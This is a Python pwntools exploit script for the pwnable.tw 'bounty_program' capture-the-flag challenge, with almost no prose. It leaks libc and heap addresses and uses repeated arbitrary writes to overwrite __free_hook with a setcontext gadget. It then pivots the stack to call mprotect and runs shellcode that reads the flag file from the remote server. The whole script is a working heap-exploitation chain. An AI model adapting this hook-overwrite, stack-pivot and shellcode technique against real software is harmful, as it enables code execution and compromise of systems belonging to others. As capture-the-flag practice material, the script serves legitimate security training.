from pwn import *
import psutil



sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)


def start_wrapper():
    sla(b'Name:', b'GLIBC_TUNABLES')
    sla(b'Value:', b'glibc.malloc.perturb=190')
def register(name, pw, cont):
    sa(b'choice: ', b'2')
    sa(b'Username:', name)
    sa(B'Password:', pw)
    sa(b'Contact:', cont)
def login(name, pw):
    sla(b'choice: ', b'1')
    sa(b'Username:', name)
    sa(B'Password:', pw)
def logout():
    sla(b'choice: ', b'7')
def show_products_in_user_menu():
    sla(b'choice: ', b'3')
def change_pw(pw):
    sla(b'choice: ', b'2')
    sa(b'password:', pw)
def show_product():
    sla(b'choice: ', b'3')
def change_cont(cont):
    sla(b'choice: ', b'4')
    sa(b'Contact:', cont)
def remove_usr():
    sla(b'choice: ', b'5')
def user_info():
    sla(b'choice: ', b'6')
def add_product(name, company, comment):
    sla(b'choice: ', b'1')
    sla(b'Product:', name)
    sla(b'Company:', company)
    sla(b'Comment:', comment)
def add_type(size, types, prices):
    sla(b'choice: ', b'2')
    sla(b'Size:', str(size).encode())
    types = b','.join(types)
    sa(b'Type:', types)
    for i in range(len(prices)):
        sla(b'Price:', str(prices[i]).encode())
def add_type_null(price):
    sla(b'choice: ', b'2')
    sla(b'Size:', str(0xfffffffffffffff).encode())
    p.recvuntil(b'type: ')
    leak = p.recvline()[:-1]
    sla(b'Price:', str(price).encode())
    return leak
def bounty():
    sla(b'choice: ', b'1')
def submit_bug(id_prod, type, title, id, des_size, des):
    sla(b'choice: ', b'3')
    sla(b'ID:', str(id_prod).encode())
    sla(b'Type:', str(type).encode())
    sla(B'Title:', title)
    sla(b'ID:', str(id).encode())
    sla(b'descripton:', str(des_size).encode())
    sla(b'Descripton:', des)
def remove_type(size, name):
    sla(b'choice: ', b'4')
    sla(b'Size:', str(size).encode())
    sa(b'Type:', name)
def modify_bug(proid, bugid, new_title, des_size, des, change_type, newtype = 0):
    sla(b'choice: ', b'5')
    sla(b'ID:', str(proid).encode())
    sla(b'ID:', str(bugid).encode())
    sa(b'Title:', new_title)
    sla(b'descripton:', str(des_size))
    sa(b'Descripton:', des)
    if change_type == 1:
        sla(b'type ? ', b'y')
        sla(b'Type:', str(newtype).encode())
    else:
        sla(b'type ?', b'n')
def show_vuln(proid):
    sla(b'choice: ', b'6')
    sla(b'ID', str(proid).encode())
def evalute_vuln():
    sla(b'choice: ', b'7')
def delete_bug(prodid, bugid):
    sla(b'choice: ', b'8')
    sla(B'ID:', str(prodid).encode())
    sla(B'ID:', str(bugid).encode())
def return_main():
    sla(b'choice: ', b'0')
def logout():
    sla(b'choice: ', b'7')
elf = context.binary = ELF('bounty_program')
libc = ELF('libc.so.6')

#nc chall.pwnable.tw 10208
p = remote('chall.pwnable.tw', 10208)
#p = remote('0', 1337)



#LEAK LIBC
#print('main arena: ', hex(libc.symbols['main_arena']))
start_wrapper()
register(b'A', b'A', b'A')
login(b'A'*0x1f, b'A'*0xf)
bounty()
add_product(b'prodname', b'company', b'A'*0xe)
add_type(0x500, [b'\x01\x00'], [100])
leak = add_type_null(100)
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
libc.address = (leak << 8) - 0x3ec000
print('libc: ', hex(libc.address))



#LEAK HEAP
remove_type(10, b'\x01\x00')
remove_type(10, b'\x00\x00')
add_type(0x10, [b'\x01\x00'], [100])
leak = add_type_null(100)
tmp = leak
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
heap = (leak << 8) - 0x600
print('heap: ', hex(heap))



remove_type(0x10, b'\x01')
remove_type(0x10, tmp)
remove_type(0x10, b'RCE')
remove_type(0x10, b'XSS')
remove_type(0x10, b'DoS')


add_type(0x58, [b'A'*0x57], [0xffffffff]) # make chunk 0x60
add_type(0x28, [b'A'*0x28], [0x1ffffff])
submit_bug(0, 0, b'title', b'id', 0x400, b'des')
evalute_vuln()
#make some free chunk with big size (BTW it's useless)
add_type(0x148, [b'B'*0x140], [0x1])
remove_type(0x148, b'B'*0x140)
#remove nullbytes from _free_hook
return_main()
change_pw(b'A'*0x38 + p64(heap + 0x8b0 + 0x138)[:-2]) #is_evaluated field
change_cont(b'\x00')
change_pw(b'A'*0x38 + p64(heap + 0x8b0 + 0x100)[:-2]) # reporter field
change_cont(p64(libc.symbols['__free_hook'] - 0x30)[:-2])
bounty()
evalute_vuln() # write 0xffffff to __free_hook
return_main()
change_pw(b'A'*0x38 + p64(heap + 0x8b0 + 0x138)[:-2]) # is _evaluated field
change_cont(b'\x00')
change_pw(b'A'*0x38 + p64(heap + 0x8b0 + 0x100)[:-2])   # reporter field
change_cont(p64(libc.symbols['__free_hook'] - 0x30 + 0x4)[:-2])
bounty()
evalute_vuln() # write 0xffffffff to _free_hook + 0x4

#write free_hook with gadget
return_main()
change_pw(b'A'*0x38 + p64(libc.symbols['__free_hook'])[:-2]) # is _evaluated field
change_cont(p64(libc.symbols['setcontext'] + 53))
bounty()
#0x7fbb5448d0a5 <setcontext+53>:	mov    rsp,QWORD PTR [rdi+0xa0]
#   0x7fbb5448d0ac <setcontext+60>:	mov    rbx,QWORD PTR [rdi+0x80]
#   0x7fbb5448d0b3 <setcontext+67>:	mov    rbp,QWORD PTR [rdi+0x78]
#   0x7fbb5448d0b7 <setcontext+71>:	mov    r12,QWORD PTR [rdi+0x48]
#   0x7fbb5448d0bb <setcontext+75>:	mov    r13,QWORD PTR [rdi+0x50]
#   0x7fbb5448d0bf <setcontext+79>:	mov    r14,QWORD PTR [rdi+0x58]
#   0x7fbb5448d0c3 <setcontext+83>:	mov    r15,QWORD PTR [rdi+0x60] 
#   0x7fbb5448d0c7 <setcontext+87>:	mov    rcx,QWORD PTR [rdi+0xa8]
#  0x7fbb5448d0ce <setcontext+94>:	push   rcx
#   0x7fbb5448d0cf <setcontext+95>:	mov    rsi,QWORD PTR [rdi+0x70]
#   0x7fbb5448d0d3 <setcontext+99>:	mov    rdx,QWORD PTR [rdi+0x88]
#   0x7fbb5448d0da <setcontext+106>:	mov    rcx,QWORD PTR [rdi+0x98]
#   0x7fbb5448d0e1 <setcontext+113>:	mov    r8,QWORD PTR [rdi+0x28]
#   0x7fbb5448d0e5 <setcontext+117>:	mov    r9,QWORD PTR [rdi+0x30]
#   0x7fbb5448d0e9 <setcontext+121>:	mov    rdi,QWORD PTR [rdi+0x68]
#   0x7fbb5448d0ed <setcontext+125>:	xor    eax,eax
#   0x7fbb5448d0ef <setcontext+127>:	ret    



chunk_addr = heap + 0x13e0
shellcode_addr = chunk_addr + 0x110
chunk = flat(0, 0,
             0, 0,
             0, 0, # pad, r8
             0, 0, # r9, pad
             0, 0, # pad, r12
             0, 0, # r13, r14
             0, heap, # r15, rdi
             0x2000, 0, # rsi, rbp
             0, 0x7, # rbx, rdx
             0, 0, #pad, rcx2
             chunk_addr + 0x100, libc.symbols['mprotect'], # rsp, rcx
             0, 0,
             0, 0,
             0, 0,
             0, 0,
             0, 0,
             shellcode_addr, 0
             )
shellcode = shellcraft.open('/home/bounty_program/flag')
shellcode += shellcraft.read('rax', 'rsp', 0x40)
shellcode += shellcraft.write(0, 'rsp', 0x40)
print('shellcode len: ', hex(len(bytes(asm(shellcode)))))
chunk += bytes(asm(shellcode))                                                  


submit_bug(0, 0, b'title', 0xdeadbeef, 0x500, chunk)
pause()
delete_bug(0, 0xdeadbeef)


p.interactive()